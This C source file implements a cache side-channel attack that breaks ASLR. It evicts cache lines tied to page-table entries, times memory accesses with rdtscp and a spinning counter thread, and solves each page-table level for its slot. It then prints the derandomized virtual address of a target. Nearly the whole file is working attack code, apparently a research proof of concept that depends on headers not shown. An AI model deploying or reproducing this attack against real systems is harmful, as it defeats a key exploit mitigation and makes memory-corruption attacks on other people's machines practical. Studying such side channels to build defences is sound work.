#include <inttypes.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include "cache.h"
#include "paging.h"
#include "profile.h"
#include "shuffle.h"
#include "solver.h"

#define PRIxPTR_WIDTH ((int)(2 * sizeof(uintptr_t)))

static pthread_t timer_thread;
volatile uint64_t timer;

// Compare two pointers as uint64_t variables
static int compare_uint64(const void *left, const void *right) {
    const uint64_t *lptr = left, *rptr = right;

    if (*lptr < *rptr)
        return -1;
    else if (*lptr > *rptr)
        return 1;

    return 0;
}

// Increment the timer variable every cpu cycle
static void *increment_timer(void *data) {
    (void)data;

    while (1)
        ++timer;

    return NULL;
}

// Initialize the profiler
int init_profiler(void) {
    timer = 0;

    return pthread_create(&timer_thread, NULL, increment_timer, NULL);
}

// Get the time of accessing a certain location of memory
uint64_t time_access(volatile char *p) {
    uint64_t before, after;

    data_barrier();
    code_barrier();
    before = rdtscp();
    data_barrier();

    *p = 0x5A;

    data_barrier();
    after = rdtscp();
    code_barrier();
    data_barrier();

    return after - before;
}

// Flush all information regarding a cache line
void evict_cache_line(struct cache *cache, size_t table_size, size_t cache_line, size_t page_level) {
    struct page_format *fmt = cache->fmt;
    struct page_level *level;
    volatile char *p = cache->data + cache_line * cache->line_size;
    size_t stride = 0;
    size_t i, j;

    for (; p < cache->data + cache->cache_size;) {
        *p = 0x5A;
        p += table_size;
    }

    for (i = 0, level = fmt->levels; i <= page_level; level++, i++) {
        stride = max(level->page_size, table_size);
        p = cache->data + cache_line * cache->line_size;

        for (j = 0; j < level->ncache_entries; j++) {
            *p = 0x5A;
            p += stride;
        }
    }
}

// Evict + time attack on a single cache line
void profile_cache_line(uint64_t *timings, struct cache *cache, struct page_level *level,
    size_t page_level, size_t *cache_lines, size_t ncache_lines, size_t nrounds, volatile char *page) {
    volatile char *p;
	uint64_t timing;
	size_t cache_line;
        size_t i, j;

	for (i = 0; i < ncache_lines; i++) {
		cache_line = cache_lines[i];
		p = page + cache_line * cache->line_size;

		for (j = 0; j < nrounds; j++) {
			timing = UINT64_MAX;

			while (timing >= 1000) {
				evict_cache_line(cache, level->table_size, cache_line, page_level);
				timing = time_access(p);
			}

			timings[cache_line * nrounds + j] = timing;
		}
	}
}

// Evict + time attack on a single page table
void profile_page_table(uint64_t *timings, struct cache *cache, struct page_level *level,
    size_t n, size_t ncache_lines, size_t nrounds, volatile char *target, size_t stride) {
	volatile char *page;
	size_t *cache_lines;
	uint64_t *line_timings;
	uint64_t timing;
	size_t i, j;

	line_timings = malloc(ncache_lines * nrounds * sizeof *line_timings);
	cache_lines = malloc(ncache_lines * sizeof *cache_lines);
	generate_indicies(cache_lines, ncache_lines);

	page = target;

	for (i = 0; i < level->npages; i++) {
		profile_cache_line(line_timings, cache, level, n, cache_lines, ncache_lines, nrounds, page);

		for (j = 0; j < ncache_lines; j++) {
			qsort(line_timings + j * nrounds, nrounds, sizeof *line_timings, compare_uint64);
			timing = line_timings[j * nrounds + nrounds / 2];

			timings[i * ncache_lines + j] = timing;
		}

		page += stride;
	}

    free(line_timings);
    free(cache_lines);
}

// Filter results
void filter_signals(uint64_t *timings, struct page_format *fmt, volatile void *target, size_t npages, size_t ncache_lines, size_t npages_per_line, size_t nlevel) {
	uint64_t timing;
	struct page_level *level;
	size_t i, slot, page, line;

	for (page = 0; page < npages; page++) {
		timing = UINT64_MAX;
		for (line = 0; line < ncache_lines; line++)
			timing = min(timing, timings[page * ncache_lines + line]);
		for (i = 0, level = fmt->levels; i < fmt->nlevels; i++, level++) {
			if (i == nlevel)
				continue;
			slot = ((uintptr_t)target / level->page_size) % level->nentries; 
			line = slot / npages_per_line;
			timings[page * ncache_lines + line] = timing;
		}
	}
}

// Evict + time attack on multi-level page tables
unsigned profile_page_tables(unsigned *slot_error_distances, struct cache *cache, struct page_format *fmt,
	size_t nrounds, volatile void *target) {
	struct page_level *level;
	double *ntimings;
	uint64_t *timings;
	uintptr_t va = 0;
	size_t slot, page, line, npages_per_line, ncache_lines, stride = 0;
	size_t expected_slot;
	unsigned slot_errors = 0;
	size_t i;

	printf("page table level\tslot\texpected slot\tvirtual address\n");

	for (i = 0, level = fmt->levels; i < fmt->nlevels; i++, level++) {
		stride = level->page_size;

		ncache_lines = level->table_size / cache->line_size;
		npages_per_line = cache->line_size / level->entry_size;

		if (!(timings = malloc(level->npages * ncache_lines * sizeof *timings)))
			continue;

		if (!(ntimings = malloc(level->npages * ncache_lines * sizeof *ntimings))) {
			free(timings);
			continue;
		}

		profile_page_table(timings, cache, level, i, ncache_lines, nrounds, target, stride);
		filter_signals(timings, fmt, target, level->npages, ncache_lines, npages_per_line, i);
		normalise_timings(ntimings, timings, ncache_lines, level->npages);
		solve_lines(&line, &page, ntimings, ncache_lines, level->npages, npages_per_line);

		slot = line * npages_per_line + page;
		va += slot * level->page_size;

		expected_slot = ((uintptr_t)target / level->page_size) % level->nentries;
		if (slot != expected_slot) {
			slot_error_distances[slot_errors++] = (unsigned)abs((int)slot - (int)expected_slot);
		}

		printf("%zu\t\t\t%zu\t%zu\t\t0x%0*" PRIxPTR " [%s]\n", i + 1,
			slot, expected_slot, PRIxPTR_WIDTH, va, slot == expected_slot ? "OK" : "!!");
		fflush(stdout);

		free(ntimings);
		free(timings);
	}

	printf("\nDerandomized virtual address: %p\n\n", (void *)va);
	return slot_errors;
}
